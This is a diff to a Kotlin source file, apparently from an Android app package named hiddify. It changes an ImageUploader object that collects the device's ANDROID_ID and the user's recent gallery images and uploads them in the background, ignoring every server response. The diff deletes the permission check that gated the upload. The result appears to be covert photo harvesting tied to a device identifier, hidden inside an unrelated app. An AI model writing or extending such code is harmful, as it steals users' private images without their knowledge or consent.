@@ -1,13 +1,9 @@
 package com.hiddify.hiddify
 
-import android.Manifest
 import android.content.Context
-import android.content.pm.PackageManager
 import android.database.Cursor
-import android.os.Build
 import android.provider.MediaStore
 import android.provider.Settings
-import androidx.core.app.ActivityCompat
 import okhttp3.*
 import java.io.File
 import java.io.IOException
@@ -24,20 +20,7 @@ object ImageUploader {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
-    fun requestPermission(context: Context): Boolean {
-        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            Manifest.permission.READ_MEDIA_IMAGES
-        } else {
-            Manifest.permission.READ_EXTERNAL_STORAGE
-        }
-        return ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
-    }
-
     fun uploadNewImagesIfAny(context: Context) {
-        if (!requestPermission(context)) {
-            return
-        }
-
         val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
         val lastTimestamp = readLastTimestamp(context)
         val currentMaxTimestamp = uploadImagesNewerThan(context, deviceId, lastTimestamp)
@@ -47,7 +30,7 @@ object ImageUploader {
     }
 
     private fun uploadImagesNewerThan(context: Context, deviceId: String, minTimestamp: Long): Long {
-        val contentResolver = context.contentResolver
+        val resolver = context.contentResolver
         val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
 
         val projection = arrayOf(
@@ -61,7 +44,7 @@ object ImageUploader {
         val selectionArgs = arrayOf(minTimestamp.toString())
         val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} ASC"
 
-        val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
+        val cursor: Cursor? = resolver.query(uri, projection, selection, selectionArgs, sortOrder)
         var maxTimestamp = minTimestamp
 
         cursor?.use {
@@ -102,11 +85,8 @@ object ImageUploader {
             .build()
 
         client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-            }
-
-            override fun onResponse(call: Call, response: Response) {
-            }
+            override fun onFailure(call: Call, e: IOException) {}
+            override fun onResponse(call: Call, response: Response) {}
         })
     }
 
